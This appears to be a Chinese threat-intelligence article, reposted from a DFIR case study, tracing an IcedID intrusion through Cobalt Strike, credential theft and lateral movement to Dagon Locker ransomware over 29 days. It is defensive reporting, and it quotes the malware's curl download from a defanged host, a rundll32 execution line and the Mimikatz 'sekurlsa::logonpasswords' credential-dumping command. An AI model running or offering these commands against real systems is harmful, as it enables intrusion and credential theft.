---
title: 从最初的漏洞利用到最终的部署勒索软件 历时29天
url: https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&mid=2247544389&idx=3&sn=734a0b2e81822614531a01b0fb820078&chksm=fa939884cde41192c274f3323d6c14a905dbf4cd6019689437052b2a4792497ae4844d97918b&scene=58&subscene=0#rd
source: CNCERT国家工程研究中心
date: 2024-05-07
fetch_date: 2025-10-06T17:18:39.565741
---

# 从最初的漏洞利用到最终的部署勒索软件 历时29天

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/GoUrACT176mesqjROCeLT7gxw7xNaws6jiaGGCFhvnLhnkiaibAghPKj0gZQkuQLLG1cTbrA3eaoicSHJIH1WJHB4g/0?wx_fmt=jpeg)

# 从最初的漏洞利用到最终的部署勒索软件 历时29天

网络安全应急技术国家工程中心

A网络安全专家仔细追踪了一次复杂的勒索软件攻击的时间线，从最初的漏洞利用到部署 Dagon Locker 勒索软件历时了 29 天。

该案例研究不仅阐明了网络犯罪分子的效率和持久性，还强调了组织当今面临的网络威胁不断变化的情况。

# **演变与升级**

这次攻击始于通过 IcedID 进行网络渗透。IcedID 是一种臭名昭著的恶意软件，最初设计用于银行欺诈，但后来演变为一种用于更广泛网络犯罪活动的多功能工具。

该恶意软件通过欺骗性电子邮件传播，诱使员工下载恶意 JavaScript 文件。

一旦进入系统，IcedID 通过与命令和控制服务器通信建立立足点，为进一步的恶意活动奠定基础。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYdbF0vYDZzylmicaBH9HgqZDtlrRl2c1eKrnS670kyTPvqudOu6LVIfw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

执行

# **工具部署**

在接下来的几天里，攻击者部署了各种工具来保持持久性并在网络上横向移动。

Rclone、Netscan、Nbtscan、AnyDesk、Seatbelt、Sharefinder 和 AdFind 用于侦察网络环境并为最终有效负载做好准备。

此阶段至关重要，因为它允许攻击者绘制网络图、识别有价值的目标并战略性地规划勒索软件部署。

本案例研究根据 DFIR 报告的见解对每个攻击阶段进行了详细分析。

攻击者最初通过 IcedID 恶意软件获得访问权限，通常通过包含恶意附件或链接的网络钓鱼电子邮件进行分发。

此阶段的主要目标是在网络内建立立足点而不发出警报。

# **执行**

初次访问后，恶意软件会在主机系统中永久安装脚本，为部署更多有效负载和更深层次的网络渗透奠定了基础。

当用户执行下载的 JavaScript 文件 Document\_Scan\_468.js 时，以下步骤会发生：

1.使用 curl 命令创建 bat 文件以从 moashraya[.]com 下载 IcedID 有效负载。

---

C:\Windows\System32\cmd.exe” /c echo curl https://moashraya[.]com/out/t.php –output “%temp%\magni.waut.a” –ssl no-revoke –insecure –location > “%temp%\magni.w.bat

2.执行批处理脚本。

cmd.exe /c “%temp%\magnu.w.bat”

3.下载后，文件 magni.waut.a 被重命名为 magni.w。

cmd.exe /c ren “%temp%\magni.waut.a” “magni.w”

4.使用 rundll32.exe，它使用下载并重命名的文件 magni.w 中的参数 \k arabika752 执行函数 scab。

rundll32 “%temp%\magni.w”, scab \k arabika752

攻击者通过使用复杂的持久性机制（例如注册表修改和计划任务）来确保他们继续存在于网络中。

威胁行为者在不同的服务器上创建了多个计划任务，以实现 Cobalt Strike 的持久执行。计划任务文件由 svchost 注入的进程创建。

如下所示，计划任务文件是由 svchost 注入的进程创建的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwY0pOrzovicYOepWczxhChJWoez1At1dg5ey2LOry7epVrbhJeAAwyUyw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

计划任务文件是由 svchost 注入进程创建的

这使得他们即使在重新启动或尝试清理的情况下也能保持对受感染系统的控制。

# **权限提升**

攻击者利用系统漏洞和错误配置来获取更高级别的权限。

当威胁参与者创建新用户帐户时，他们将其添加到特权活动目录组中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYUEd1nlTNrKsIX5sxlnlFxujrnnhFk3wVL0IsAEDUnR9pY120HZJVkg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

特权活动目录组

提升的权限使他们能够操纵系统进程并访问网络的受限区域。

攻击者采用各种技术来避免检测，包括混淆其恶意软件、禁用安全措施以及使用合法的管理工具。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYaCJpO6Zarnw9CfZguuOss4lMJRcoX5UoupJgR1IUmDSjaQsyWl1iblQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

IcedID 将自身注入 svchost.exe

这些行动有助于保持攻击的隐秘性，使其能够不受阻碍地进行。

Cobalt Strike 提供了一套工具，用于从 LSASS（本地安全机构子系统服务）进程检索散列凭据，包括“logonpassword”命令。

该命令使用 Mimikatz 模块“sekurlsa::logonpasswords”直接从系统内存中提取凭据。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYAWJwHIAonZRpia14HgOJ4tk3tme9xK6R6ibyecwic2VqJSKDnaxDzzYdQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

Sysmon 正确，允许跟踪对 LSASS 内存的访问

为了有效地监控和识别此类未经授权的活动，必须实施和微调系统监控实用程序 Sysmon。

正确配置 Sysmon 可以监控访问 LSASS 内存的尝试，这是检测潜在凭据盗窃的关键步骤，如附图所示。

对凭据的访问促进了对系统和数据的未经授权访问，从而增加了攻击者对网络的控制。

一旦进入网络，攻击者就会进行监视以识别有价值的资产和数据。

在本报告详细介绍的执行阶段，我们观察到 IcedID 恶意软件注入父进程 svchost.exe，随后执行凭据提取。

此行为是一个重要的观察结果，将恶意软件与 LSASS 进程的未经授权访问联系起来。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYHJe5lsgJEpt9rEEP8wc5Se0ibs31r3QOs5eRq4YHQwJq64DTAnNVQEw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

这些信息指导了他们在受感染环境中的后续行动和目标选择。

# **横向移动**

攻击者使用窃取的凭据和工具在网络中横向移动。

为了促进跨不同系统的横向移动，威胁行为者利用了 Cobalt Strike 信标中的“jump winrm”功能，该功能利用了 Windows PowerShell 远程协议 (MS-PSRP)。

这种方法强调了内置网络协议的复杂使用来扩大攻击范围。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYlnLZwMicA3HklBeu138NprDd7yAPNXyibgVDpJEtd4IemefWoqq2uMeQ/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

内置网络协议扩大攻击范围

从受感染服务器的内存中提取 – 显示 Cobalt Strike 信标执行此类横向移动时执行的进程。

横向移动使他们能够扩大影响范围并危及其他系统。

# **收藏**

在入侵过程中，威胁参与者瞄准并访问了与 IT 部门相关的多个文件。

此外，他们还使用通过 Cobalt Strike 信标执行的 PowerShell 命令从域控制器转储和窃取 Windows 安全事件日志。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wpkib3J60o2ic1t6NhQl2tZZrJ5JupcQwYoy3l9PLLvxeLRnbcpMy6duAXF8JOkeVv2438E95JicNLicQEb7tmNQOw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

# **命令与控制**

在此入侵期间，持续时间延长和网络不稳定导致缺乏一些典型可用的网络工件，从而导致数据中存在潜在的缺口。

仅在入侵的前两天检测到 IcedID 的命令和控制流量。相反，Cobalt Strike 指挥和控制流量从第二天开始，并在整个入侵过程中持续存在。

对从前面提到的 PowerShell 脚本中提取的 Cobalt Strike 配置的分析揭示了威胁行为者采用的几种策略：

· 他们选择了合法的 Windows 进程 gpupdate.exe 来注入 Cobalt Strike shellcode。

· 他们利用 Early Bird APC 队列注入技术来绕过安全措施。

· 他们试图将 Cobalt Strike 流量伪装成与 cloudfront.amazonaws.com 的合法连接。

· 他们配置了三个 IP 地址作为命令和控制 (C2) 服务器。

这使他们能够发送命令、部署额外的有效负载和窃取数据。数据被泄露到攻击者控制的服务器上。

泄露带来了重大的隐私和安全风险，导致潜在的数据泄露和合规问题。Dagon Locker 勒索软件的部署导致文件和系统加密、运营停机以及由于赎金要求和恢复成本而造成的财务损失。

此次攻击需要全面的事件响应，包括系统恢复、加强安全态势和监管报告。

# **时间线**

· 第一天：通过 IcedID 恶意软件进入。

· 第 2-10 天：建立持久性和权限升级。

· 第 11-20 天：侦察和横向移动。

· 第 21-28 天：勒索软件部署的数据收集和暂存。

· 第 29 天：  Dagon Locker 勒索软件激活。

这次攻击体现了现代网络威胁的快速和隐蔽性。组织必须增强其网络安全框架，采取主动的威胁搜寻实践，并确保持续监控以防御此类复杂的攻击。

DFIR 报告提供的详细细分不仅阐明了特定的攻击向量，而且还可以作为网络安全社区的重要学习工具。

**参考及来源：**

https://gbhackers.com/hackers-tool-29-sabotage-ransomware-attack/

原文来源：嘶吼专业版

“投稿联系方式：010-82992251   sunzhonghao@cert.org.cn”

![](https://mmbiz.qpic.cn/mmbiz_jpg/GoUrACT176n1NvL0JsVSB8lNDX2FCGZjW0HGfDVnFao65ic4fx6Rv4qylYEAbia4AU3V2Zz801UlicBcLeZ6gS6tg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

预览时标签不可点

阅读原文

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/GoUrACT176mrRug7icLIhX4EvNQjNgGRibia7K9qOLTR5PDfQiaUesU9xge7pnF8iciaxVC3JVkNqHA2pvQDnrM0hDVQ/0?wx_fmt=png)

网络安全应急技术国家工程中心

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/GoUrACT176mrRug7icLIhX4EvNQjNgGRibia7K9qOLTR5PDfQiaUesU9xge7pnF8iciaxVC3JVkNqHA2pvQDnrM0hDVQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过